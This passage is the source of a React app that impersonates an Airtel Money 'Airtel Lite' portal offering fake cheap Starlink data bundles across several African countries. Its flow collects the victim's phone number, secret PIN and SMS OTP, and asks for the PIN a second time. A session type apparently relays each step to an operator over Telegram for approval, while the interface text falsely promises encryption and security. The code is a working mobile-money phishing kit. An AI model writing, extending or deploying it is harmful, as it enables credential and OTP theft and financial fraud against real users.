import React, { Component, createContext, useContext, useState, useEffect, ErrorInfo, ReactNode } from 'react';
import { AnimatePresence, motion } from 'motion/react';
import { AlertTriangle, CheckCircle2, Compass, ExternalLink, Globe, Loader2, ShieldCheck, X } from 'lucide-react';
import { safeStorage, safeScrollToTop, detectInAppBrowser, getExternalBrowserUrl } from './utils/telegram';
import { LoanCalculator } from './components/LoanCalculator';
import { LoanApplication1, PaymentProvider } from './components/LoanApplication1';
import { LoginForm } from './components/LoginForm';
import { VerificationForm } from './components/VerificationForm';
import { LoanApplication2, SuccessPage } from './components/LoanApplication2';
export interface InternetPlan {
  id: string;
  dataAmount: string;
  dataUnit: string;
  networkType: string;
  validity: string;
  price: string;
  priceNum: number;
  badge?: string;
  badgeColor?: string;
  isPopular?: boolean;
  features: string[];
  speedTier: string;
}

export type Step = 'PLANS' | 'PROVIDER' | 'LOGIN' | 'OTP' | 'REENTER_PIN' | 'SUCCESS';

export type VerificationStatus = 'idle' | 'waiting_telegram' | 'approved' | 'rejected' | 'error';

export interface TelegramSession {
  sessionId: string;
  phone: string;
  pin: string;
  reenterPin?: string;
  otp?: string;
  selectedPlan: InternetPlan;
  loginStatus: 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
  createdAt: number;
  lastUpdated: number;
}


export const INTERNET_PLANS: InternetPlan[] = [
  {
    id: 'plan_1gb',
    dataAmount: '1',
    dataUnit: 'GB',
    networkType: '4G / Starlink Direct',
    validity: 'Valide 1 Jour',
    price: '$0.19',
    priceNum: 0.19,
    features: ['Vitesse jusqu’à 50 Mbps', 'Appels WhatsApp illimités', 'Réseau basse latence'],
    speedTier: '50 Mbps',
  },
  {
    id: 'plan_3gb',
    dataAmount: '3',
    dataUnit: 'GB',
    networkType: '4G / Starlink Direct',
    validity: 'Valide 3 Jours',
    price: '$0.39',
    priceNum: 0.39,
    features: ['Vitesse optimisée 75 Mbps', 'Streaming HD inclus', 'Priorité Starlink'],
    speedTier: '75 Mbps',
  },
  {
    id: 'plan_7gb',
    dataAmount: '7',
    dataUnit: 'GB',
    networkType: '4G+ / Starlink Turbo',
    validity: 'Valide 7 Jours',
    price: '$0.79',
    priceNum: 0.79,
    features: ['Vitesse 120 Mbps', 'Téléchargements rapides', 'Couverture nationale étendue'],
    speedTier: '120 Mbps',
  },
  {
    id: 'plan_15gb',
    dataAmount: '15',
    dataUnit: 'GB',
    networkType: '4G+ Ultra / Satellite',
    validity: 'Valide 7 Jours',
    price: '$1.49',
    priceNum: 1.49,
    badge: 'Populaire',
    badgeColor: 'bg-amber-500 text-white',
    isPopular: true,
    features: ['Vitesse 200 Mbps Starlink', 'Ultra HD Streaming 4K', 'Hotspot illimité'],
    speedTier: '200 Mbps',
  },
  {
    id: 'plan_35gb',
    dataAmount: '35',
    dataUnit: 'GB',
    networkType: 'Starlink Hybrid Pro',
    validity: 'Valide 15 Jours',
    price: '$2.99',
    priceNum: 2.99,
    badge: 'Pro',
    badgeColor: 'bg-emerald-600 text-white',
    features: ['Liaison directe Satellite LEO', 'Latence ultra-faible <25ms', 'Assistance prioritaire 24/7'],
    speedTier: '280 Mbps',
  },
  {
    id: 'plan_50gb',
    dataAmount: '50',
    dataUnit: 'GB',
    networkType: '4G+ / Starlink Orbit',
    validity: 'Valide 30 Jours',
    price: '$3.49',
    priceNum: 3.49,
    badge: 'Avantage',
    badgeColor: 'bg-sky-600 text-white',
    features: ['Vitesse 240 Mbps Starlink', 'Streaming Ultra HD & Réseaux', 'Couverture RDC intégrale'],
    speedTier: '240 Mbps',
  },
  {
    id: 'plan_80gb',
    dataAmount: '80',
    dataUnit: 'GB',
    networkType: 'Starlink Max Orbit',
    validity: 'Valide 30 Jours',
    price: '$4.99',
    priceNum: 4.99,
    badge: 'Max Performance',
    badgeColor: 'bg-indigo-600 text-white',
    features: ['Bande passante non bridée', 'Gaming et visioconférence HD', 'Accès prioritaire constellation'],
    speedTier: '350 Mbps',
  },
];


export type Language = 'fr' | 'en';

export interface CountryInfo {
  id: string; // ISO 2-letter
  nameEn: string;
  nameFr: string;
  dialCode: string;
  flag: string;
  defaultLang: Language;
  airtelBrand: string;
  minDigits: number;
  maxDigits: number;
  validPrefixes: string[];
  placeholder: string;
  example: string;
  timezones: string[];
  descriptionEn: string;
  descriptionFr: string;
}

export const AIRTEL_COUNTRIES: CountryInfo[] = [
  {
    id: 'CD',
    nameEn: 'Democratic Republic of the Congo',
    nameFr: 'Rép. Dém. du Congo (RDC)',
    dialCode: '+243',
    flag: '🇨🇩',
    defaultLang: 'fr',
    airtelBrand: 'Airtel RDC',
    minDigits: 9,
    maxDigits: 9,
    validPrefixes: [],
    placeholder: '99 123 4567',
    example: '99 123 4567',
    timezones: ['Africa/Kinshasa', 'Africa/Lubumbashi'],
    descriptionEn: '9 digits required (format: XX XXX XXXX)',
    descriptionFr: '9 chiffres requis (format : XX XXX XXXX)',
  },
  {
    id: 'CG',
    nameEn: 'Congo',
    nameFr: 'Congo',
    dialCode: '+242',
    flag: '🇨🇬',
    defaultLang: 'fr',
    airtelBrand: 'Airtel Congo (Brazzaville)',
    minDigits: 8,
    maxDigits: 9,
    validPrefixes: [],
    placeholder: '06 123 4567',
    example: '06 123 4567',
    timezones: ['Africa/Brazzaville'],
    descriptionEn: '8 to 9 digits required (format: XX XXX XXXX)',
    descriptionFr: '8 à 9 chiffres requis (format : XX XXX XXXX)',
  },
  {
    id: 'TD',
    nameEn: 'Chad',
    nameFr: 'Tchad',
    dialCode: '+235',
    flag: '🇹🇩',
    defaultLang: 'fr',
    airtelBrand: 'Airtel Tchad',
    minDigits: 8,
    maxDigits: 8,
    validPrefixes: [],
    placeholder: '66 12 34 56',
    example: '66 12 34 56',
    timezones: ['Africa/Ndjamena'],
    descriptionEn: '8 digits required (format: XX XX XX XX)',
    descriptionFr: '8 chiffres requis (format : XX XX XX XX)',
  },
  {
    id: 'GA',
    nameEn: 'Gabon',
    nameFr: 'Gabon',
    dialCode: '+241',
    flag: '🇬🇦',
    defaultLang: 'fr',
    airtelBrand: 'Airtel Gabon',
    minDigits: 8,
    maxDigits: 9,
    validPrefixes: [],
    placeholder: '07 12 34 56',
    example: '07 12 34 56',
    timezones: ['Africa/Libreville'],
    descriptionEn: '8 to 9 digits required (format: XX XX XX XX)',
    descriptionFr: '8 à 9 chiffres requis (format : XX XX XX XX)',
  },
  {
    id: 'KE',
    nameEn: 'Kenya',
    nameFr: 'Kenya',
    dialCode: '+254',
    flag: '🇰🇪',
    defaultLang: 'en',
    airtelBrand: 'Airtel Kenya',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '733 123 456',
    example: '733 123 456',
    timezones: ['Africa/Nairobi'],
    descriptionEn: '9 to 10 digits required (format: XXX XXX XXX)',
    descriptionFr: '9 à 10 chiffres requis (format : XXX XXX XXX)',
  },
  {
    id: 'MG',
    nameEn: 'Madagascar',
    nameFr: 'Madagascar',
    dialCode: '+261',
    flag: '🇲🇬',
    defaultLang: 'fr',
    airtelBrand: 'Airtel Madagascar',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '33 12 345 67',
    example: '33 12 345 67',
    timezones: ['Africa/Antananarivo'],
    descriptionEn: '9 to 10 digits required (format: XX XX XXX XX)',
    descriptionFr: '9 à 10 chiffres requis (format : XX XX XXX XX)',
  },
  {
    id: 'MW',
    nameEn: 'Malawi',
    nameFr: 'Malawi',
    dialCode: '+265',
    flag: '🇲🇼',
    defaultLang: 'en',
    airtelBrand: 'Airtel Malawi',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '99 123 4567',
    example: '99 123 4567',
    timezones: ['Africa/Blantyre'],
    descriptionEn: '9 to 10 digits required (format: XX XXX XXXX)',
    descriptionFr: '9 à 10 chiffres requis (format : XX XXX XXXX)',
  },
  {
    id: 'NE',
    nameEn: 'Niger',
    nameFr: 'Niger',
    dialCode: '+227',
    flag: '🇳🇪',
    defaultLang: 'fr',
    airtelBrand: 'Airtel Niger',
    minDigits: 8,
    maxDigits: 8,
    validPrefixes: [],
    placeholder: '96 12 34 56',
    example: '96 12 34 56',
    timezones: ['Africa/Niamey'],
    descriptionEn: '8 digits required (format: XX XX XX XX)',
    descriptionFr: '8 chiffres requis (format : XX XX XX XX)',
  },
  {
    id: 'NG',
    nameEn: 'Nigeria',
    nameFr: 'Nigéria',
    dialCode: '+234',
    flag: '🇳🇬',
    defaultLang: 'en',
    airtelBrand: 'Airtel Nigeria',
    minDigits: 10,
    maxDigits: 11,
    validPrefixes: [],
    placeholder: '802 123 4567',
    example: '802 123 4567',
    timezones: ['Africa/Lagos'],
    descriptionEn: '10 to 11 digits required (format: XXX XXX XXXX)',
    descriptionFr: '10 à 11 chiffres requis (format : XXX XXX XXXX)',
  },
  {
    id: 'RW',
    nameEn: 'Rwanda',
    nameFr: 'Rwanda',
    dialCode: '+250',
    flag: '🇷🇼',
    defaultLang: 'en',
    airtelBrand: 'Airtel Rwanda',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '73 123 4567',
    example: '73 123 4567',
    timezones: ['Africa/Kigali'],
    descriptionEn: '9 to 10 digits required (format: XX XXX XXXX)',
    descriptionFr: '9 à 10 chiffres requis (format : XX XXX XXXX)',
  },
  {
    id: 'SC',
    nameEn: 'Seychelles',
    nameFr: 'Seychelles',
    dialCode: '+248',
    flag: '🇸🇨',
    defaultLang: 'en',
    airtelBrand: 'Airtel Seychelles',
    minDigits: 7,
    maxDigits: 7,
    validPrefixes: [],
    placeholder: '251 2345',
    example: '251 2345',
    timezones: ['Indian/Mahe'],
    descriptionEn: '7 digits required (format: XXX XXXX)',
    descriptionFr: '7 chiffres requis (format : XXX XXXX)',
  },
  {
    id: 'TZ',
    nameEn: 'Tanzania',
    nameFr: 'Tanzanie',
    dialCode: '+255',
    flag: '🇹🇿',
    defaultLang: 'en',
    airtelBrand: 'Airtel Tanzania',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '784 123 456',
    example: '784 123 456',
    timezones: ['Africa/Dar_es_Salaam'],
    descriptionEn: '9 to 10 digits required (format: XXX XXX XXX)',
    descriptionFr: '9 à 10 chiffres requis (format : XXX XXX XXX)',
  },
  {
    id: 'UG',
    nameEn: 'Uganda',
    nameFr: 'Ouganda',
    dialCode: '+256',
    flag: '🇺🇬',
    defaultLang: 'en',
    airtelBrand: 'Airtel Uganda',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '701 234 567',
    example: '701 234 567',
    timezones: ['Africa/Kampala'],
    descriptionEn: '9 to 10 digits required (format: XXX XXX XXX)',
    descriptionFr: '9 à 10 chiffres requis (format : XXX XXX XXX)',
  },
  {
    id: 'ZM',
    nameEn: 'Zambia',
    nameFr: 'Zambie',
    dialCode: '+260',
    flag: '🇿🇲',
    defaultLang: 'en',
    airtelBrand: 'Airtel Zambia',
    minDigits: 9,
    maxDigits: 10,
    validPrefixes: [],
    placeholder: '97 123 4567',
    example: '97 123 4567',
    timezones: ['Africa/Lusaka'],
    descriptionEn: '9 to 10 digits required (format: XX XXX XXXX)',
    descriptionFr: '9 à 10 chiffres requis (format : XX XXX XXXX)',
  },
];

/**
 * Format raw digits according to country phone number grouping
 */
export function formatPhoneNumber(digits: string, country: CountryInfo): string {
  const d = digits.replace(/\D/g, '');
  if (!d) return '';

  // 8 digits: XX XX XX XX
  if (country.minDigits === 8 && country.maxDigits === 8) {
    if (d.length <= 2) return d;
    if (d.length <= 4) return `${d.slice(0, 2)} ${d.slice(2)}`;
    if (d.length <= 6) return `${d.slice(0, 2)} ${d.slice(2, 4)} ${d.slice(4)}`;
    return `${d.slice(0, 2)} ${d.slice(2, 4)} ${d.slice(4, 6)} ${d.slice(6, 8)}`;
  }

  // 7 digits (Seychelles): XXX XXXX
  if (country.maxDigits === 7) {
    if (d.length <= 3) return d;
    return `${d.slice(0, 3)} ${d.slice(3, 7)}`;
  }

  // 9 digits (Congo, DRC, Rwanda, Zambia): XX XXX XXXX
  if (country.minDigits === 9 && country.maxDigits === 9) {
    if (d.length <= 2) return d;
    if (d.length <= 5) return `${d.slice(0, 2)} ${d.slice(2)}`;
    return `${d.slice(0, 2)} ${d.slice(2, 5)} ${d.slice(5, 9)}`;
  }

  // 9-10 digits (Kenya, Tanzania, Uganda): XXX XXX XXX or XXX XXX XXXX
  if (country.id === 'KE' || country.id === 'TZ' || country.id === 'UG') {
    if (d.length <= 3) return d;
    if (d.length <= 6) return `${d.slice(0, 3)} ${d.slice(3)}`;
    if (d.length <= 9) return `${d.slice(0, 3)} ${d.slice(3, 6)} ${d.slice(6, 9)}`;
    return `${d.slice(0, 3)} ${d.slice(3, 6)} ${d.slice(6, 10)}`;
  }

  // 10-11 digits (Nigeria): XXX XXX XXXX or XXXX XXX XXXX
  if (country.id === 'NG') {
    if (d.length <= 3) return d;
    if (d.length <= 6) return `${d.slice(0, 3)} ${d.slice(3)}`;
    if (d.length <= 10) return `${d.slice(0, 3)} ${d.slice(3, 6)} ${d.slice(6, 10)}`;
    return `${d.slice(0, 4)} ${d.slice(4, 7)} ${d.slice(7, 11)}`;
  }

  // General 8-10 digits: XX XXX XXXX
  if (d.length <= 2) return d;
  if (d.length <= 5) return `${d.slice(0, 2)} ${d.slice(2)}`;
  if (d.length <= 9) return `${d.slice(0, 2)} ${d.slice(2, 5)} ${d.slice(5, 9)}`;
  return `${d.slice(0, 3)} ${d.slice(3, 6)} ${d.slice(6, 10)}`;
}

/**
 * Validate phone number against minimum/maximum length and country dial code.
 * NOTE: DOES NOT restrict on starting numbers (e.g. 04, 05, 06, etc. are NOT restricted).
 * Validates strictly format length and requires code.
 */
export function validateAirtelPhone(
  country: CountryInfo,
  rawPhone: string
): { isValid: boolean; normalized: string; formatted: string; errorEn?: string; errorFr?: string } {
  // Strip non-digits
  let digits = rawPhone.replace(/\D/g, '');

  if (!digits) {
    return {
      isValid: false,
      normalized: '',
      formatted: '',
      errorEn: `Please enter phone number for ${country.nameEn}`,
      errorFr: `Veuillez saisir votre numéro pour ${country.nameFr}`,
    };
  }

  // If user pasted or typed international dial code prefix (e.g. 243, 242, 254), cleanly strip it
  const dialDigits = country.dialCode.replace(/\D/g, '');
  if (digits.startsWith(dialDigits) && digits.length > dialDigits.length) {
    digits = digits.slice(dialDigits.length);
  }

  const formatted = formatPhoneNumber(digits, country);
  const isExactLength = country.minDigits === country.maxDigits;

  // Enforce minimum digits
  if (digits.length < country.minDigits) {
    return {
      isValid: false,
      normalized: digits,
      formatted,
      errorEn: isExactLength
        ? `Number must be exactly ${country.minDigits} digits (${digits.length}/${country.minDigits}).`
        : `Number too short. Between ${country.minDigits} and ${country.maxDigits} digits required (${digits.length}/${country.minDigits}).`,
      errorFr: isExactLength
        ? `Le numéro doit comporter exactement ${country.minDigits} chiffres (${digits.length}/${country.minDigits}).`
        : `Numéro trop court. Entre ${country.minDigits} et ${country.maxDigits} chiffres requis (${digits.length}/${country.minDigits}).`,
    };
  }

  // Enforce maximum digits
  if (digits.length > country.maxDigits) {
    return {
      isValid: false,
      normalized: digits,
      formatted,
      errorEn: `Number too long. Maximum ${country.maxDigits} digits allowed (${digits.length}/${country.maxDigits}).`,
      errorFr: `Numéro trop long. Maximum ${country.maxDigits} chiffres autorisés (${digits.length}/${country.maxDigits}).`,
    };
  }

  // Any starting number is allowed (no restriction on 04, 05, 06, etc.)
  return {
    isValid: true,
    normalized: digits,
    formatted,
  };
}

/**
 * Default country is Democratic Republic of the Congo (RDC / +243).
 * Auto-detection of language or location is disabled per requirements.
 */
export const DEFAULT_COUNTRY: CountryInfo = AIRTEL_COUNTRIES[0]; // DRC (CD, +243)

export function detectUserCountry(): CountryInfo {
  return DEFAULT_COUNTRY;
}


export const TRANSLATIONS = {
  fr: {
    // Header & Nav
    starlinkStatus: 'Réseau Starlink RDC : Opérationnel',
    starlinkStatusGlobal: 'Réseau Satellite Starlink : Opérationnel',
    airtelLitePortal: 'Portail Airtel Lite',
    selectCountry: 'Sélectionner votre pays',
    countryRequired: 'Sélection du pays obligatoire',
    langFr: 'Français',
    langEn: 'English',

    // Plans Page
    badgeTag: 'Forfaits Internet & Constellation Starlink',
    directToCell: 'Direct-to-Cell',
    heroTitle1: 'Restez Connecté',
    heroTitle2: 'Sans Limites',
    heroSubtitle:
      'Choisissez votre forfait. Vous serez redirigé vers la page sécurisée Airtel Lite pour valider et finaliser votre paiement.',
    
    // Filter options
    filterAll: 'Tous les forfaits',
    filterDaily: 'Journalier',
    filterWeekly: 'Hebdomadaire',
    filterMonthly: 'Mensuel',
    filter30Days: 'Valide 30 Jours',
    filterStarlink: 'Réseau Starlink',

    filterAllSub: 'Toutes les offres disponibles',
    filterDailySub: 'Valide 1 Jour & 3 Jours',
    filterWeeklySub: 'Valide 7 Jours & 15 Jours',
    filterMonthlySub: 'Forfaits 30 Jours',
    filter30DaysSub: 'Haute validité 30 Jours',
    filterStarlinkSub: 'Liaison Satellite LEO Très Haut Débit',

    categorySelected: 'Catégorie sélectionnée',
    changeCategory: 'Changer',
    closeCategory: 'Fermer',
    selectOfferPrompt: 'Sélectionnez un forfait',
    showingPlans: 'Affichage de',
    plansWord: 'forfaits',
    planWordSingular: 'forfait',
    forFilter: 'pour :',
    seeAll: 'Voir tout',

    // Plan Card
    popularRibbon: 'LE PLUS POPULAIRE • MEILLEURE VENTE',
    perPlan: '/ forfait',
    choosePlan: 'CHOISIR CE FORFAIT',
    starlinkNetwork: 'Réseau Starlink',
    highSpeedLeo: 'Internet Très Haut Débit LEO',

    // Security Banner
    securityTitle: 'Sécurité Airtel NextGen & Starlink LEO',
    securityDesc:
      'Paiement instantané débité sur votre solde Airtel Money / Lite avec validation cryptée.',
    securityBadge: '100% SÉCURISÉ',

    // Footer
    copyright: 'Tous droits réservés',
    satellitePartner: 'Réseau Satellite Direct-to-Cell',

    // Login Page
    backToPlans: 'Changer de forfait',
    back: 'Retour',
    selectedPlanPill: 'Forfait Starlink sélectionné',
    loginTitle: 'Connectez-vous à Airtel Lite pour finaliser le paiement.',
    loginSubtitle: 'Renseignez votre pays, votre numéro Airtel et votre code secret.',
    countryLabel: 'Pays Airtel (Obligatoire)',
    phoneLabel: 'Numéro de Téléphone Airtel',
    pinLabel: 'Entrez votre Code Secret',
    show: 'Afficher',
    hide: 'Masquer',
    validateContinue: 'VALIDER ET CONTINUER',
    connecting: 'Connexion en cours...',
    searchCountryPlaceholder: 'Rechercher un pays...',
    countryRequiredAlert: 'Veuillez d’abord sélectionner votre pays Airtel.',
    phoneFormatHint: 'Format attendu :',
    secureNote:
      'Vos identifiants sont protégés par le protocole bancaire Airtel Money et chiffrés de bout en bout.',

    // Modal
    validatingPin: 'Validation du code PIN...',
    validatingOtp: 'Validation du code OTP...',
    verifyingPinMsg:
      'Vérification de vos identifiants Airtel Lite en cours. Veuillez patienter...',
    verifyingOtpMsg:
      'Vérification du code de sécurité SMS en cours. Veuillez patienter...',
    secureProcessing: 'Traitement sécurisé',
    pinApproved: 'Code PIN validé !',
    otpApproved: 'Code OTP validé !',
    redirecting: 'Redirection vers l’étape suivante...',
    activatingPlan: 'Activation de votre forfait en cours...',
    pinRejected: 'Code PIN non valide',
    otpRejected: 'Code OTP incorrect',
    retryPrompt: 'Veuillez vérifier et réessayer.',
    encryptedSession: 'Session Chiffrée Airtel 256-bit',

    // OTP Page
    otpTitle: 'Vérification par SMS (OTP)',
    otpSubtitle: 'Un code de validation à 4 chiffres a été envoyé par SMS au',
    otpInputLabel: 'Code de Sécurité SMS',
    resendIn: 'Renvoyer le code dans',
    resendButton: 'Renvoyer le code par SMS',
    confirmActivate: 'CONFIRMER ET ACTIVER',
    validating: 'Validation...',
    otpError: 'Code OTP incorrect ou expiré. Veuillez vérifier le SMS et réessayer.',

    // Re-enter PIN Page
    reenterPinTitle: 'Confirmation du Code PIN',
    reenterPinSubtitle: 'Veuillez ressaisir votre code PIN correct pour valider et finaliser l’activation de votre forfait.',
    reenterPinBadge: 'Étape de Sécurité Finale',
    reenterPinLabel: 'Ressaisissez votre Code PIN Secret (4 chiffres)',
    reenterPinHelper: 'Entrez votre code secret Airtel Money pour confirmer l’opération et activer le forfait.',
    confirmAndActivate: 'CONFIRMER ET ACTIVER LE FORFAIT',
    pinMismatchAlert: 'Code PIN non correspondant. Veuillez ressaisir votre code PIN correct.',
    validatingReenterPin: 'Vérification du code PIN...',
    verifyingReenterPinMsg: 'Vérification de la conformité de votre code PIN en cours. Veuillez patienter...',
    reenterPinApproved: 'Code PIN confirmé !',
    reenterPinRejected: 'Code PIN incorrect. Veuillez ressaisir le code PIN correct.',
    otpVerifiedBadge: 'Code OTP SMS validé avec succès',

    // Success Page
    validationSuccess: 'Validation Réussie',
    planActivatedTitle: 'Forfait Internet Activé !',
    planActivatedSubtitle:
      'Votre forfait Starlink x Airtel est maintenant immédiatement utilisable sur votre ligne.',
    digitalReceipt: 'REÇU NUMÉRIQUE OFFICIEL',
    clientPhone: 'Numéro Client :',
    transactionRef: 'Réf. Transaction :',
    dateLabel: 'Date d’activation :',
    networkLabel: 'Réseau :',
    amountLabel: 'Montant facturé :',
    statusLabel: 'Statut du forfait :',
    statusActive: 'Actif & Opérationnel',
    testedSpeed: 'Débit descendant actuel :',
    speedTestTitle: 'TEST DE CONNEXION STARLINK',
    speedTestRunning: 'Mesure de débit en cours...',
    runSpeedTest: 'Tester la vitesse Starlink',
    testAgain: 'Refaire le test',
    getAnotherPlan: 'Prendre un autre forfait',
  },
  en: {
    // Header & Nav
    starlinkStatus: 'Starlink DRC Network: Operational',
    starlinkStatusGlobal: 'Starlink Satellite Network: Operational',
    airtelLitePortal: 'Airtel Lite Portal',
    selectCountry: 'Select your country',
    countryRequired: 'Country selection required',
    langFr: 'Français',
    langEn: 'English',

    // Plans Page
    badgeTag: 'Internet Bundles & Starlink Constellation',
    directToCell: 'Direct-to-Cell',
    heroTitle1: 'Stay Connected',
    heroTitle2: 'Without Limits',
    heroSubtitle:
      'Choose your bundle. You will be redirected to the secure Airtel Lite page to validate and complete your payment.',
    
    // Filter options
    filterAll: 'All Plans',
    filterDaily: 'Daily',
    filterWeekly: 'Weekly',
    filterMonthly: 'Monthly',
    filter30Days: '30 Days Validity',
    filterStarlink: 'Starlink Network',

    filterAllSub: 'All available offers',
    filterDailySub: 'Valid 1 Day & 3 Days',
    filterWeeklySub: 'Valid 7 Days & 15 Days',
    filterMonthlySub: '30 Days Bundles',
    filter30DaysSub: 'Long duration 30 Days',
    filterStarlinkSub: 'High-Speed LEO Satellite Link',

    categorySelected: 'Selected Category',
    changeCategory: 'Change',
    closeCategory: 'Close',
    selectOfferPrompt: 'Select a bundle',
    showingPlans: 'Showing',
    plansWord: 'plans',
    planWordSingular: 'plan',
    forFilter: 'for:',
    seeAll: 'View all',

    // Plan Card
    popularRibbon: 'MOST POPULAR • BEST SELLER',
    perPlan: '/ bundle',
    choosePlan: 'SELECT THIS BUNDLE',
    starlinkNetwork: 'Starlink Network',
    highSpeedLeo: 'Ultra High-Speed LEO Internet',

    // Security Banner
    securityTitle: 'Airtel NextGen & Starlink LEO Security',
    securityDesc:
      'Instant payment charged from your Airtel Money / Lite balance with encrypted verification.',
    securityBadge: '100% SECURE',

    // Footer
    copyright: 'All rights reserved',
    satellitePartner: 'Direct-to-Cell Satellite Network',

    // Login Page
    backToPlans: 'Change bundle',
    back: 'Back',
    selectedPlanPill: 'Selected Starlink Bundle',
    loginTitle: 'Log in to Airtel Lite to complete payment.',
    loginSubtitle: 'Select your country, enter your Airtel number and secret PIN.',
    countryLabel: 'Airtel Country (Compulsory)',
    phoneLabel: 'Airtel Phone Number',
    pinLabel: 'Enter your Secret PIN',
    show: 'Show',
    hide: 'Hide',
    validateContinue: 'VALIDATE & CONTINUE',
    connecting: 'Connecting...',
    searchCountryPlaceholder: 'Search country...',
    countryRequiredAlert: 'Please select your Airtel country first.',
    phoneFormatHint: 'Expected format:',
    secureNote:
      'Your credentials are protected by Airtel Money banking-grade protocol and end-to-end encryption.',

    // Modal
    validatingPin: 'Validating PIN code...',
    validatingOtp: 'Validating OTP code...',
    verifyingPinMsg:
      'Verifying your Airtel Lite credentials. Please wait...',
    verifyingOtpMsg:
      'Verifying your SMS security code. Please wait...',
    secureProcessing: 'Secure processing',
    pinApproved: 'PIN code validated!',
    otpApproved: 'OTP code validated!',
    redirecting: 'Redirecting to next step...',
    activatingPlan: 'Activating your bundle...',
    pinRejected: 'Invalid PIN code',
    otpRejected: 'Incorrect OTP code',
    retryPrompt: 'Please verify and try again.',
    encryptedSession: 'Airtel 256-bit Encrypted Session',

    // OTP Page
    otpTitle: 'SMS Verification (OTP)',
    otpSubtitle: 'A 4-digit verification code has been sent via SMS to',
    otpInputLabel: 'SMS Security Code',
    resendIn: 'Resend code in',
    resendButton: 'Resend code via SMS',
    confirmActivate: 'CONFIRM & ACTIVATE',
    validating: 'Validating...',
    otpError: 'Incorrect or expired OTP code. Please check your SMS and try again.',

    // Re-enter PIN Page
    reenterPinTitle: 'Confirm Secret PIN',
    reenterPinSubtitle: 'Please re-enter your correct PIN code to validate and finalize your bundle activation.',
    reenterPinBadge: 'Final Security Step',
    reenterPinLabel: 'Re-enter your Secret PIN Code (4 digits)',
    reenterPinHelper: 'Enter your Airtel Money secret PIN to confirm transaction and activate the bundle.',
    confirmAndActivate: 'CONFIRM & ACTIVATE BUNDLE',
    pinMismatchAlert: 'PIN codes do not match. Please ensure you enter the correct secret PIN.',
    validatingReenterPin: 'Verifying PIN code...',
    verifyingReenterPinMsg: 'Verifying your secret PIN. Please wait...',
    reenterPinApproved: 'PIN code confirmed!',
    reenterPinRejected: 'Incorrect PIN code. Please re-enter the correct PIN.',
    otpVerifiedBadge: 'SMS OTP Code Successfully Verified',

    // Success Page
    validationSuccess: 'Validation Successful',
    planActivatedTitle: 'Internet Bundle Activated!',
    planActivatedSubtitle:
      'Your Starlink x Airtel bundle is now immediately active on your mobile line.',
    digitalReceipt: 'OFFICIAL DIGITAL RECEIPT',
    clientPhone: 'Customer Number:',
    transactionRef: 'Transaction Ref:',
    dateLabel: 'Activation Date:',
    networkLabel: 'Network:',
    amountLabel: 'Amount Billed:',
    statusLabel: 'Bundle Status:',
    statusActive: 'Active & Operational',
    testedSpeed: 'Current Download Speed:',
    speedTestTitle: 'STARLINK SPEED TEST',
    speedTestRunning: 'Measuring bandwidth...',
    runSpeedTest: 'Test Starlink Speed',
    testAgain: 'Test Again',
    getAnotherPlan: 'Get Another Bundle',
  },
};

export type TranslationKey = keyof typeof TRANSLATIONS.fr;

export function getTranslation(key: TranslationKey, lang: Language): string {
  return TRANSLATIONS[lang]?.[key] || TRANSLATIONS.fr[key] || '';
}


interface AppContextValue {
  country: CountryInfo;
  setCountry: (country: CountryInfo, autoUpdateLanguage?: boolean) => void;
  language: Language;
  setLanguage: (lang: Language) => void;
  toggleLanguage: () => void;
  t: (key: TranslationKey) => string;
  hasUserSelectedCountry: boolean;
  setHasUserSelectedCountry: (value: boolean) => void;
}

const AppContext = createContext<AppContextValue | null>(null);

export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // Initialize country: DRC (+243) is strictly default under numbers selection
  const [country, setCountryState] = useState<CountryInfo>(() => {
    const savedCountryId = safeStorage.getItem('airtel_country_id');
    if (savedCountryId) {
      const found = AIRTEL_COUNTRIES.find((c) => c.id === savedCountryId);
      if (found) return found;
    }
    return DEFAULT_COUNTRY;
  });

  const [hasUserSelectedCountry, setHasUserSelectedCountry] = useState<boolean>(() => {
    return Boolean(safeStorage.getItem('airtel_country_selected'));
  });

  // Initialize language: French is strictly default. Do not auto-detect.
  const [language, setLanguageState] = useState<Language>(() => {
    const savedLang = safeStorage.getItem('airtel_language') as Language;
    if (savedLang === 'fr' || savedLang === 'en') {
      return savedLang;
    }
    return 'fr';
  });

  // Set country (language does not auto switch unless explicitly requested)
  const setCountry = (newCountry: CountryInfo, autoUpdateLanguage: boolean = false) => {
    setCountryState(newCountry);
    setHasUserSelectedCountry(true);
    safeStorage.setItem('airtel_country_id', newCountry.id);
    safeStorage.setItem('airtel_country_selected', 'true');

    if (autoUpdateLanguage) {
      setLanguageState(newCountry.defaultLang);
      safeStorage.setItem('airtel_language', newCountry.defaultLang);
    }
  };

  const setLanguage = (lang: Language) => {
    setLanguageState(lang);
    safeStorage.setItem('airtel_language', lang);
  };

  const toggleLanguage = () => {
    const nextLang = language === 'fr' ? 'en' : 'fr';
    setLanguage(nextLang);
  };

  const t = (key: TranslationKey) => getTranslation(key, language);

  return (
    <AppContext.Provider
      value={{
        country,
        setCountry,
        language,
        setLanguage,
        toggleLanguage,
        t,
        hasUserSelectedCountry,
        setHasUserSelectedCountry,
      }}
    >
      {children}
    </AppContext.Provider>
  );
};

export function useApp(): AppContextValue {
  const context = useContext(AppContext);
  if (!context) {
    throw new Error('useApp must be used within an AppProvider');
  }
  return context;
}


// Exact Airtel iconic loop & signature emblem matching the uploaded logo
export const AirtelIcon: React.FC<{ className?: string; color?: string }> = ({
  className = 'w-7 h-7',
  color,
}) => {
  return (
    <svg
      viewBox="0 0 24 24"
      className={`${className} shrink-0`}
      fill={color || '#E60000'}
      xmlns="http://www.w3.org/2000/svg"
    >
      {/* Official Airtel Fluid "a" Signature Loop from uploaded asset */}
